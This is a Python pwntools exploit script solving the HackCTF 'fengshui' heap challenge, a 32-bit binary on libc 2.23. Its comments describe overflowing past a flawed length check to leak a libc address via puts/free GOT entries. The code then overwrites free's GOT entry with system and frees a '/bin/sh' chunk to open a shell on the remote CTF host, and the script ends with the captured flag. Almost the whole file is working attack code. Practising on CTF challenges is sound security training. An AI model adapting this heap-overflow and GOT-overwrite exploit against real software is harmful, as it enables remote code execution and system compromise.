from pwn import * 
#sovle from ubuntu 16.04
#32bit binary, using libc 2.23 . it seems liek heap exploitation. 
#index start number is  0
#add location, heap allocate name and text. text chunk has name chunk's addr. 
#text size should'nt bigger than descripttion size. 
#but length check construction just check length between name chunk and desc chunk.
#so, if i put other chunk between 2 chunks , i can input texts more then desc size.. 
#make unsorted bin size chunk, and merge of them -> overwrite index 1 chunk's view pointer by puts_got.
#i can leak libc-base address. next step - overwrite somewhere. 
#let's assume overwrite free's GOT, when free(ptr) call, ptr have desc's address. i can overwrite there too. 
#can overwrite fastbin's fd and modify next allocate fastbin's address? 
# it fail because fastbin chunk size check.  
# think about how modify function works,
# Refer to the address value of the name chunk pointing to the descending chunk for writing.
# if i overwrite something to there, modify function will wirte there. (ex,free_got)

#p = process("./fengshui")
p = remote("ctf.j0n9hyun.xyz",3028)


#store :0x0804B080 

puts_got = 0x804b024
puts_offset = 0x5fca0
free_hook_offset = 0x1b38b0
free_got = 0x804b010
free_offset = 0x71470
bin_offset = 0x15ba0b
system_offset = 0x3ada0

def add(sd,name,tl,text) : 
    p.sendlineafter(":","0")
    p.sendlineafter("description:",str(sd))
    p.sendlineafter("Name:",name)
    p.sendlineafter("length:",str(tl))
    p.sendlineafter("Text:",text)
    
def remove(idx) :
    p.sendlineafter(":","1")
    p.sendlineafter("Index: ",str(idx))    
    
def view(idx) :
    p.sendlineafter(":","2")
    p.sendlineafter("Index: ",str(idx))    
    
def update(idx,tl,text) :
    p.sendlineafter(":","3")
    p.sendlineafter("Index: ",str(idx))    
    p.sendlineafter("length: ",str(tl))
    p.sendlineafter("Text: ",text)
    
if __name__ == "__main__" : 
    add(0x10,"0"*0x10,0x10,"0"*0x10) #0
    add(0x10,"1"*0x10,0x10,"1"*0x10) #1
    add(0x10,"2"*0x10,0x10,"/bin/sh\x00") #2
    remove(0)
    

    add(0x80,"3"*0x10,0x100,"3"*0xA0+p32(free_got)) #3?
   
    view(1)
 
    p.recvuntil("Description: ")
    rcv = u32(p.recv(4))       #leak puts addr 
    libc = rcv-free_offset
    log.info("libc base : "+hex(libc))
    #log.info("libc base : "+hex(rcv))

    system = libc + system_offset
    update(1,0x4,p32(system))
    pause()
    remove(2)
    
    
    p.interactive()
    #HackCTF{1_h34rd_1t_thr0ugh_th3_gr4p3v1n3}